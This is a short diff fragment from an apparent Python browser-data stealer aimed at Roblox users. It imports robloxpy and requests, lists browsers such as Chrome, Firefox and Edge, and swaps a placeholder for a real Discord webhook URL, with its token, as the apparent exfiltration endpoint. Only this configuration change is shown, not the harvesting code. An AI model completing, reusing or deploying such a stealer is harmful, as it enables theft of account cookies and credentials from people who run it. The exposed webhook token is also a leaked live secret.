@@ -5,7 +5,7 @@ import requests
 import json
 import robloxpy
 
-url = "webhookURL"
+url = "https://discord.com/api/webhooks/1317704312985747477/C3WzGGj9cZlaMM8MyB-SZAGGrChiiKTjvVl1luIBglGd7nB6m3k_yZLxkL3uPqvemnSz"
 
 # List of supported browsers
 browsers = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'chromium']
